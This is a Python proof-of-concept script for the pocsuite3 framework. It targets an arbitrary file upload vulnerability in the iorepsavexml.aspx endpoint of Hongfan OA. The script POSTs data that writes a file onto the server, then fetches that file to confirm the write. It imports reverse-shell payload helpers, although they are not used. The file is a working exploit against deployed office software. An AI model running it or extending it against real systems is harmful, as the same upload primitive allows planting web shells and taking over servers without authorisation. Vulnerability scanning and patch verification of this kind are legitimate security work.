# _*_ coding:utf-8 _*_
# @Time : 2023/12/24
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class iorepsavexml(POCBase):
    pocDesc = '''红帆OA iorepsavexml.aspx文件上传漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-24'
    name = '红帆OA iorepsavexml.aspx文件上传漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=check.txt&filepath=/upfiles/rep/pic/'
        check_path = self.url+ "/ioffice/upfiles/rep/pic/check.txt"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            'Accept-Encoding': 'gzip, deflate',
            'Cache-Control': 'max-age=0',
            'Connection': 'close',
            "Cookie": "ASP.NET_SessionId=lcluwirkrcqj42iuxfvafoq4",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            data = "123456789"

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200:
                check_response = requests.get(check_path, headers=headers, verify=False)
                if check_response.status_code == 200 and '123456789' in check_response.text:
                    result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(iorepsavexml)